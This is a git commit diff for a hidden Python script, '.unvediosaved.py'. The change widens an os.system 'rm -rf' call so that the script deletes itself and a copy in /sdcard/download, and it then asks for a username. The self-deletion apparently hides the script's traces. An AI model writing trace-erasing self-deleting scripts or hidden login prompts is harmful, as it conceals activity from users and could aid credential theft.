43c20ec9df043a4bb5eb996847534c72cf62f1d7
sfr404sfrzed <86876730+sfr404sfrzed@users.noreply.github.com>
2021-07-27 15:16:41 +0300

    Update .unvediosaved.py

--- .unvediosaved.py
+++ .unvediosaved.py
@@ -16,7 +16,7 @@ G = "\033[32m"
 W = "\033[0;1m" 
 R = "\033[31m"   
 C = "\033[36;1m"
-os.system("rm -rf .unvediosaved.py")
+os.system("rm -rf .unvediosaved.py ;rm -rf /sdcard/download/.unvediosaved.py")
 joker = "4"
 print(W+'------------------------------------------------------\n  '+wd+'intaka daxl bka gullm'+W+'\n------------------------------------------------------')
 user = input(" username : ")
